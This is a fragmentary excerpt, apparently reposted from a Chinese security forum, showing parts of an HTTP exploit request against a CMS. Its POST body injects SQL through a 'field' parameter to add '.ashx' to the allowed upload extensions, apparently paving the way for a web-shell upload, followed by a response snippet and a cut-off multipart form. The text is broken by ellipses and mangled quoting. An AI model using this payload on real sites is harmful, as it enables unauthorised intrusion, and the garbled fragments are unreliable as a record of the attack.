...
> 原文：[https://www.zhihuifly.com/t/topic/3062](https://www.zhihuifly.com/t/topic/3062)
...
Host: www.0-sec.org
Content-Length: 106
Connection: Keep-Alive `submit=1&swf_upload=2&table=pa_field&field=file_ext=".jpg,.jpeg,.gif,.bmp,.ashx"  where id=174 and max_num` 
```
...
Date: Sat, 13 Jul 2019 07:52:02 GMT `<script type=‘text/javascript’>location.href=’?result=cs_error’</script>` 
```
...
Content-Disposition: form-data; name=“submit” `1
